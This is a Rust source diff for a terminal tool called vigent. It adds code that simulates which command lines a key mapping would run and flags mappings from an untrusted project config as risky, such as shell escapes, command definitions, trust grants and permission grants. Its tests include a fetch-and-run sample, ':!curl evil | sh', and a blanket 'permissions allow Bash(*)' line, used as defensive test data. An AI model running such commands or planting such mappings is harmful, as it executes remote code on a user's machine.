@@ -676,6 +676,297 @@ fn rhs_text(value: &RhsValue) -> String {
 }
 
 // ---------------------------------------------------------------------------
+// What a mapping runs (a project's [keys] wait for :trust when it's risky)
+// ---------------------------------------------------------------------------
+
+/// A command line a mapping runs (src/keys.ts CommandLine). `sure` is false
+/// when the mapping edits the line in ways vigent doesn't follow (cursor
+/// moves, history, completion, pasting): what runs is then unknown, and
+/// counts as risky.
+#[derive(Clone, Debug, PartialEq)]
+pub struct CommandLine {
+    pub text: String,
+    pub sure: bool,
+}
+
+/// keys that run the command line
+const SUBMIT_KEYS: [&str; 3] = ["<CR>", "<C-m>", "<C-j>"];
+/// the same, typed out as text (`<NL>` has no key of its own, so it types itself)
+const SUBMIT_TEXT: [&str; 6] = ["<cr>", "<enter>", "<return>", "<nl>", "<c-m>", "<c-j>"];
+
+/// The next `<CR>` (or another key that runs the line) typed out as text in `s`, at or after byte `from`: (start, end).
+fn submit_text(s: &str, from: usize) -> Option<(usize, usize)> {
+    let lower = s.to_ascii_lowercase();
+    (from..lower.len()).filter(|&i| lower.as_bytes()[i] == b'<').find_map(|i| SUBMIT_TEXT.iter().find(|t| lower[i..].starts_with(*t)).map(|t| (i, i + t.len())))
+}
+
+/// The command line as a mapping replays keys onto it (src/keys.ts mappingCommandLines).
+struct LineSim {
+    out: Vec<CommandLine>,
+    /// "normal" (also VISUAL), "insert" or "line"
+    at: &'static str,
+    buf: String,
+    /// the buffer is exactly `buf`, with the cursor at its end
+    sure: bool,
+    /// text vigent can't see comes before `buf` (a [keys.command] mapping's line)
+    hidden: bool,
+    /// how much of `buf` was looked at for <CR> typed out as text
+    scanned: usize,
+}
+
+impl LineSim {
+    fn enter(&mut self, text: &str) {
+        self.at = "line";
+        self.buf.clear();
+        self.sure = true;
+        self.hidden = false;
+        self.scanned = 0;
+        self.type_text(text);
+    }
+    fn submit(&mut self) {
+        self.out.push(CommandLine { text: std::mem::take(&mut self.buf), sure: self.sure });
+        self.at = "normal";
+        self.sure = true;
+        self.hidden = false;
+        self.scanned = 0;
+    }
+    fn type_text(&mut self, text: &str) {
+        self.buf.push_str(text);
+        // <CR> typed out as text: count the line before it as run; past it, the line is unknown
+        let mut from = self.buf[..self.scanned].char_indices().rev().take(7).last().map_or(self.scanned, |(i, _)| i);
+        while let Some((start, end)) = submit_text(&self.buf, from) {
+            if end > self.scanned {
+                self.out.push(CommandLine { text: self.buf[..start].to_string(), sure: self.sure });
+                self.sure = false;
+            }
+            from = end;
+        }
+        self.scanned = self.buf.len();
+    }
+    fn leave(&mut self) {
+        // unsure where the line editor is (e.g. its NORMAL mode): stay on the line, so more is found
+        if self.at == "line" && !self.sure {
+            return;
+        }
+        self.at = "normal";
+        self.buf.clear();
+        self.scanned = 0;
+    }
+    fn backspace(&mut self) {
+        if !self.sure {
+            return; // keep the text
+        }
+        if self.buf.is_empty() {
+            // vim: backspace on an empty line leaves it (unless there's text vigent can't see)
+            if !self.hidden {
+                self.leave();
+            }
+            return;
+        }
+        self.buf.pop();
+        self.scanned = self.scanned.min(self.buf.len());
+    }
+    fn clear(&mut self) {
+        if !self.sure {
+            return;
+        }
+        self.buf.clear();
+        self.hidden = false;
+        self.scanned = 0;
+    }
+}
+
+/// The command lines a mapping can run, simulated over its right-hand side the
+/// way vigent replays it, erring on the side of finding one: `:` in NORMAL or
+/// VISUAL opens the command line, text typed there adds to it, <CR> runs it.
+/// A [keys.command] mapping starts on a line vigent can't see, so what it
+/// types is taken as the whole line. (src/keys.ts mappingCommandLines)
+pub fn mapping_command_lines(mode: KeyMode, rhs: &RhsValue, leader: &str) -> Vec<CommandLine> {
+    let Ok(parts) = parse_rhs(rhs, leader) else {
+        return vec![]; // never applied: build_keymap warns about it
+    };
+    let at = match mode {
+        KeyMode::Insert => "insert",
+        KeyMode::Command => "line",
+        _ => "normal",
+    };
+    let mut sim = LineSim { out: vec![], at, buf: String::new(), sure: true, hidden: mode == KeyMode::Command, scanned: 0 };
+    for part in &parts {
+        match part {
+            Rhs::Nop => {}
+            Rhs::Ex { cmd, execute: true } => sim.out.push(CommandLine { text: cmd.clone(), sure: true }),
+            Rhs::Ex { cmd, execute: false } => sim.enter(cmd),
+            Rhs::Action { name, .. } => {
+                let name = name.as_str();
+                if name == "mode.command" {
+                    sim.enter("");
+                } else if sim.at == "line" {
+                    match name {
+                        "edit.submit" => sim.submit(),
+                        "mode.normal" => sim.leave(),
+                        "edit.backspace" => sim.backspace(),
+                        "edit.clear" => sim.clear(),
+                        "edit.delete" | "noop" => {}
+                        _ => sim.sure = false,
+                    }
+                } else if sim.at == "insert" && name != "noop" {
+                    sim.at = "normal";
+                }
+            }
+            Rhs::Keys(keys) => {
+                for key in keys {
+                    let key = key.as_str();
+                    let text = token_text(key);
+                    if sim.at == "normal" {
+                        if key == ":" {
+                            sim.enter("");
+                        }
+                    } else if sim.at == "insert" {
+                        // <Esc>, <C-[>, <CR> (the prompt is sent) or any other key: taken as back in NORMAL, where : opens the line
+                        if text.is_none() {
+                            sim.at = "normal";
+                        }
+                    } else if let Some(t) = text {
+                        sim.type_text(&t);
+                    } else if SUBMIT_KEYS.contains(&key) {
+                        sim.submit();
+                    } else if key == "<Esc>" || key == "<C-c>" {
+                        sim.leave();
+                    } else if key == "<BS>" || key == "<C-h>" {
+                        sim.backspace();
+                    } else if key == "<C-u>" {
+                        sim.clear();
+                    } else if key != "<Del>" {
+                        sim.sure = false;
+                    }
+                }
+            }
+        }
+    }
+    sim.out
+}
+
+/// Why a command line is risky from an untrusted file (src/keys.ts LineRisk).
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum LineRisk {
+    /// `:!cmd`
+    Shell,
+    /// :command, :delcommand, :map and the rest, :normal, :execute, :source
+    Defines,
+    /// :trust, :permissions allow
+    Trust,
+    /// one of your commands whose steps are risky
+    Command,
+    /// vigent can't tell what the line is
+    Unknown,
+}
+
+impl LineRisk {
+    pub fn name(self) -> &'static str {
+        match self {
+            LineRisk::Shell => "shell",
+            LineRisk::Defines => "defines",
+            LineRisk::Trust => "trust",
+            LineRisk::Command => "command",
+            LineRisk::Unknown => "unknown",
+        }
+    }
+}
+
+/// Leading `:`, whitespace and a range: `%`, `1,5`, `.,$`, `'<,'>`.
+fn strip_range(s: &str) -> &str {
+    let mut rest = s;
+    loop {
+        let mut cs = rest.chars();
+        match cs.next() {
+            Some(c) if c.is_whitespace() || ":%.$,;+-".contains(c) || c.is_ascii_digit() => rest = cs.as_str(),
+            Some('\'') if cs.clone().next().is_some_and(|m| m.is_ascii_alphabetic() || m == '<' || m == '>') => {
+                cs.next();
+                rest = cs.as_str();
+            }
+            _ => return rest,
+        }
+    }
+}
+
+/// `word` is `full` or an abbreviation of it at least as long as `min`, like vim's command names.
+fn abbrev(word: &str, min: &str, full: &str) -> bool {
+    word.starts_with(min) && full.starts_with(word)
+}
+
+/// Commands that define commands or mappings, or replay keys or lines:
+/// :command, :delcommand, every :map / :noremap / :unmap, :normal, :execute, :source.
+fn defines(word: &str) -> bool {
+    let mapping = |w: &str| w == "map" || w == "noremap" || w == "unmap" || abbrev(w, "mapc", "mapclear") || abbrev(w, "no", "noremap") || abbrev(w, "unm", "unmap");
+    let after_mode = word.strip_prefix(|c: char| "nvxsoilct".contains(c));
+    abbrev(word, "com", "command")
+        || abbrev(word, "delc", "delcommand")
+        || mapping(word)
+        || after_mode.is_some_and(|w| mapping(w) || abbrev(w, "m", "map") || abbrev(w, "u", "unmap"))
+        || matches!(word, "nn" | "vn" | "xn")
+        || abbrev(word, "norm", "normal")
+        || abbrev(word, "exe", "execute")
+        || abbrev(word, "so", "source")
+}
+
+/// Whether a command line, run from a project's untrusted .vigent.toml, could
+/// run a program or change what runs: `:!cmd`, `:command`, `:nnoremap`,
+/// `:normal`, `:trust`, or one of your commands whose steps do.
+/// `commands` gives the steps of each command a line could call by name. (src/keys.ts commandLineRisk)
+pub fn command_line_risk(line: &str, commands: &dyn Fn(&str) -> Vec<Vec<String>>, depth: usize) -> Option<LineRisk> {
+    let s = strip_range(line);
+    if s.starts_with('!') {
+        return Some(LineRisk::Shell);
+    }
+    let word: String = s.chars().take_while(|c| c.is_ascii_alphabetic()).collect();
+    if defines(&word) {
+        return Some(LineRisk::Defines);
+    }
+    let end = s.find(char::is_whitespace).unwrap_or(s.len());
+    let (name, rest) = s.split_at(end);
+    // :trust lets the file run everything; :permissions allow lets Claude Code run more
+    let allow = rest.starts_with(char::is_whitespace) && rest.trim_start().strip_prefix("allow").is_some_and(|r| r.is_empty() || r.starts_with(char::is_whitespace));
+    if word == "trust" || (matches!(word.as_str(), "perm" | "perms" | "permission" | "permissions") && allow) {
+        return Some(LineRisk::Trust);
+    }
+    let user = name.chars().next().is_some_and(|c| c.is_ascii_uppercase()) && name.chars().all(|c| c.is_ascii_alphanumeric());
+    if !user {
+        return None;
+    }
+    for steps in commands(name) {
+        for step in steps {
+            if depth >= 10 {
+                return Some(LineRisk::Command);
+            }
+            let run = crate::commands::windows::fill_args(&crate::commands::windows::normalize_step(&step), rest.trim());
+            if run.starts_with('!') || command_line_risk(&run, commands, depth + 1).is_some() {
+                return Some(LineRisk::Command);
+            }
+        }
+    }
+    None
+}
+
+/// Every risky command line a mapping can run, each with why (src/keys.ts mappingRisks).
+pub fn mapping_risks(mode: KeyMode, rhs: &RhsValue, leader: &str, commands: &dyn Fn(&str) -> Vec<Vec<String>>) -> Vec<(String, LineRisk)> {
+    mapping_command_lines(mode, rhs, leader)
+        .into_iter()
+        .filter_map(|l| {
+            let risk = if l.sure { command_line_risk(&l.text, commands, 0) } else { Some(LineRisk::Unknown) };
+            risk.map(|r| (l.text, r))
+        })
+        .collect()
+}
+
+/// The leader a keymap uses: the given one if it's a key, else the default (as build_keymap).
+pub fn leader_or_default(leader: Option<&str>) -> String {
+    match leader {
+        Some(l) if parse_keys(l, DEFAULT_LEADER).is_ok() => l.to_string(),
+        _ => DEFAULT_LEADER.to_string(),
+    }
+}
+
+// ---------------------------------------------------------------------------
 // Keymap
 // ---------------------------------------------------------------------------
 
@@ -944,6 +1235,79 @@ mod tests {
         assert!(km.lookup(KeyMode::Normal, &[",".into(), "x".into()], false).exact.is_some());
         assert!(km.lookup(KeyMode::Insert, &["j".into()], false).prefix);
         assert!(km.lookup(KeyMode::Normal, &[",".into(), "1".into()], false).exact.is_some(), "<leader>1 follows the leader");
+    }
+
+    #[test]
+    fn what_a_mapping_runs() {
+        let s = |v: &str| RhsValue::Str(v.into());
+        let lines_in = |mode: KeyMode, rhs: RhsValue, leader: &str| -> Vec<String> { mapping_command_lines(mode, &rhs, leader).into_iter().map(|l| if l.sure { l.text } else { format!("?{}", l.text) }).collect() };
+        let lines = |mode: KeyMode, rhs: RhsValue| lines_in(mode, rhs, DEFAULT_LEADER);
+        let n = KeyMode::Normal;
+        // an ex command with <CR> or <Cmd> runs; without, it only opens the line
+        assert_eq!(lines(n, s(":!curl evil | sh<CR>")), ["!curl evil | sh"]);
+        assert_eq!(lines(n, s("<Cmd>!x<CR>")), ["!x"]);
+        assert!(lines(n, s(":!x")).is_empty(), "opens the line; you press Enter");
+        assert_eq!(lines(KeyMode::Insert, s(":!x<CR>")), ["!x"], "an ex command runs from any mode");
+        // raw keys: : opens the line in NORMAL and VISUAL, <CR> runs it
+        assert_eq!(lines(n, s("q:!x<CR>")), ["!x"]);
+        assert_eq!(lines(KeyMode::Visual, s(":!x<Enter>")), ["!x"]);
+        assert_eq!(lines(n, RhsValue::List(vec![s(":"), s("!x"), s("<CR>")])), ["!x"], "a list, one piece at a time");
+        assert_eq!(lines(n, RhsValue::List(vec![s("mode.command"), s("!x"), s("edit.submit")])), ["!x"]);
+        assert_eq!(lines(n, s("q:!x<C-m>q:!y<C-j>")), ["!x", "!y"]);
+        assert_eq!(lines(n, s("q:!x<lt>NL>")), ["!x"], "<NL> typed out counts as Enter");
+        // [keys.command] starts on the line: what it types is the command
+        assert_eq!(lines(KeyMode::Command, s("!x<CR>")), ["!x"]);
+        assert_eq!(lines(KeyMode::Command, s("<BS>!x<CR>")), ["!x"], "backspace on a line vigent can't see stays on it");
+        // INSERT: <Esc> or <C-[> back to NORMAL, then :
+        assert_eq!(lines(KeyMode::Insert, s("<Esc>:!x<CR>")), ["!x"]);
+        assert_eq!(lines(KeyMode::Insert, s("<C-[>:!x<CR>")), ["!x"]);
+        assert!(lines(KeyMode::Insert, s("hello:!x")).is_empty(), "typed into the prompt");
+        // editing the line
+        assert_eq!(lines(n, s("q:x<BS>!y<CR>")), ["!y"]);
+        assert_eq!(lines(n, s("q:!x<C-u>kill<CR>")), ["kill"]);
+        assert!(lines(n, s("q:<BS>!x<CR>")).is_empty(), "backspace on an empty line leaves it");
+        assert!(lines(n, s("q:!x<Esc>")).is_empty(), "<Esc> leaves the line");
+        assert_eq!(lines(n, s("q:kill<Home>!<CR>")), ["?kill!"], "after the cursor moves, vigent can't tell");
+        assert_eq!(lines(n, s("q:<Up><CR>")), ["?"], "history: unknown");
+        assert_eq!(lines_in(n, s("<leader>!x<CR>"), ":"), ["!x"], "the leader is replayed too");
+        assert!(lines(n, s("gg")).is_empty());
+        assert!(lines(n, RhsValue::Bool(false)).is_empty());
+
+        // shell commands, and what defines or replays
+        let commands = |name: &str| -> Vec<Vec<String>> {
+            let steps: &[&str] = match name {
+                "Land" => &["!npm test", "pr"],
+                "Any" => &["{args}"],
+                "Loop" => &["Loop"],
+                "Review" => &["new -t review {args}"],
+                _ => return vec![],
+            };
+            vec![steps.iter().map(|x| x.to_string()).collect()]
+        };
+        let risky = |rhs: RhsValue| -> Vec<String> { mapping_risks(n, &rhs, DEFAULT_LEADER, &commands).into_iter().map(|(l, r)| format!("{}: {l}", r.name())).collect() };
+        assert_eq!(risky(s(":command X !y<CR>")), ["defines: command X !y"]);
+        assert_eq!(risky(s(":com! X !y<CR>")), ["defines: com! X !y"]);
+        assert_eq!(risky(s(":delcommand Land<CR>")), ["defines: delcommand Land"]);
+        assert_eq!(risky(s(":nnoremap x :!y<CR>")), ["defines: nnoremap x :!y"]);
+        for cmd in ["map", "nmap", "imap", "vmap", "xmap", "cmap", "noremap", "inoremap", "unmap", "nunmap", "nn", "norm", "normal", "exe", "execute", "so", "source"] {
+            assert_eq!(risky(s(&format!(":{cmd} x<CR>"))), [format!("defines: {cmd} x")], "{cmd}");
+        }
+        assert_eq!(risky(s(":%!sort<CR>")), ["shell: %!sort"]);
+        assert_eq!(risky(s(":'<,'>!sort<CR>")), ["shell: '<,'>!sort"]);
+        assert_eq!(risky(s(": 1,5 !sort<CR>")), ["shell: 1,5 !sort"]);
+        assert_eq!(risky(s(":trust<CR>")), ["trust: trust"]);
+        assert_eq!(risky(s(":permissions allow Bash(*)<CR>")), ["trust: permissions allow Bash(*)"]);
+        assert_eq!(risky(s("q:<Up><CR>")), ["unknown: "]);
+        // a command whose steps run a shell command, here or through {args}
+        assert_eq!(risky(s(":Land<CR>")), ["command: Land"]);
+        assert_eq!(risky(s(":Any !x<CR>")), ["command: Any !x"]);
+        assert_eq!(risky(s(":Any nmap j :!x<CR>")), ["command: Any nmap j :!x"]);
+        assert_eq!(risky(s(":Loop<CR>")), ["command: Loop"], "too deep to tell: counted");
+        // what stays allowed
+        for rhs in [s(":colorscheme nord<CR>"), s(":new "), s(":kill<CR>"), s(":Review x<CR>"), s(":permissions<CR>"), s(":q!<CR>"), s("session.next"), s("gg"), RhsValue::List(vec![s("fold.open_all"), s("scroll.bottom")]), s(":set nonumber<CR>")] {
+            assert!(risky(rhs.clone()).is_empty(), "{rhs:?}");
+        }
+        assert_eq!(command_line_risk("Land", &|_| vec![], 0), None, "a command nobody defines runs nothing");
     }
 
     #[test]
